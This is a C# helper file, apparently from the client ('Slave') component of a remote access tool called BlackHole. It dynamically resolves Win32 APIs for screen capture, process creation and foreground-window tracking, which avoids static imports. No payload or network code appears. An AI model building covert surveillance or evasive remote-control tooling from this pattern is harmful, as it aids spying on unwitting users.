using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Slave.Helper
{
    /// <summary>
    /// 
    /// </summary>
    public static class NativeHelper
    {                
        public static class gdi32
        {
            public const int ROP_COPY = 0x00CC0020;

            [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
            public delegate bool dBitBlt([In] IntPtr hdc, int xDest, int yDest, int width, int height, [In] IntPtr hdcSrc, int xSrc, int ySrc, int rop);

            [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
            public delegate IntPtr dCreateDC(string driver, string device, string output, IntPtr initData);

            [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
            public delegate bool dDeleteDC([In] IntPtr hdc);

            public static dBitBlt BitBlt = DynamicNativeCall<dBitBlt>("gdi32.dll", "BitBlt");
            public static dCreateDC CreateDC = DynamicNativeCall<dCreateDC>("gdi32.dll", "CreateDCW");
            public static dDeleteDC DeleteDC = DynamicNativeCall<dDeleteDC>("gdi32.dll", "DeleteDC");
        }

        public static class kernel32
        {

            #region structures
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            public struct STARTUPINFOEX
            {
                public STARTUPINFO StartupInfo;
                public IntPtr lpAttributeList;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct SECURITY_ATTRIBUTES
            {
                public int nLength;
                public unsafe byte* lpSecurityDescriptor;
                public int bInheritHandle;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
            }

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            public struct STARTUPINFO
            {
                public Int32 cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public Int32 dwX;
                public Int32 dwY;
                public Int32 dwXSize;
                public Int32 dwYSize;
                public Int32 dwXCountChars;
                public Int32 dwYCountChars;
                public Int32 dwFillAttribute;
                public Int32 dwFlags;
                public Int16 wShowWindow;
                public Int16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }
            #endregion
            
            [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
            public delegate bool dCreateProcess(
                string lpApplicationName,
                string lpCommandLine,
                ref SECURITY_ATTRIBUTES lpProcessAttributes,
                ref SECURITY_ATTRIBUTES lpThreadAttributes,
                bool bInheritHandles,
                uint dwCreationFlags,
                IntPtr lpEnvironment,
                string lpCurrentDirectory,
                [In] ref STARTUPINFO lpStartupInfo,
                out PROCESS_INFORMATION lpProcessInformation);

            [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
            public delegate int dGetCurrentThreadId();

            public static dGetCurrentThreadId GetCurrentThreadId = DynamicNativeCall<dGetCurrentThreadId>("kernel32.dll", "GetCurrentThreadId");
            public static dCreateProcess CreateProcess = DynamicNativeCall<dCreateProcess>("kernel32.dll", "CreateProcessW");
        }

        public static class user32
        {
            [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
            public delegate IntPtr dGetForegroundWindow();

            [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
            public delegate int dGetWindowThreadProcessId(IntPtr handle, out int processId);

            [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
            public delegate int dGetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

            public static dGetWindowText GetWindowText = DynamicNativeCall<dGetWindowText>("user32.dll", "GetWindowTextW");
            public static dGetWindowThreadProcessId GetWindowThreadProcessId = DynamicNativeCall<dGetWindowThreadProcessId>("user32.dll", "GetWindowThreadProcessId");
            public static dGetForegroundWindow GetForegroundWindow = DynamicNativeCall<dGetForegroundWindow>("user32.dll", "GetForegroundWindow");
        }
        
        /// <summary>
        /// 
        /// </summary>
        private static Dictionary<string, DynamicNativeLibrary> m_loadedLibraries = new Dictionary<string, DynamicNativeLibrary>();

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="TFunc"></typeparam>
        /// <typeparam name="TOut"></typeparam>
        /// <param name="fileName"></param>
        /// <param name="functionName"></param>
        /// <param name="callback"></param>
        public static TFunc DynamicNativeCall<TFunc>(string fileName, string functionName) where TFunc : class
        {
            // we cache loaded libraries
            if (!m_loadedLibraries.ContainsKey(fileName))
                m_loadedLibraries[fileName] = new DynamicNativeLibrary(fileName);
            return m_loadedLibraries[fileName].FindUmanagedFunction<TFunc>(functionName);            
        }
    }
}
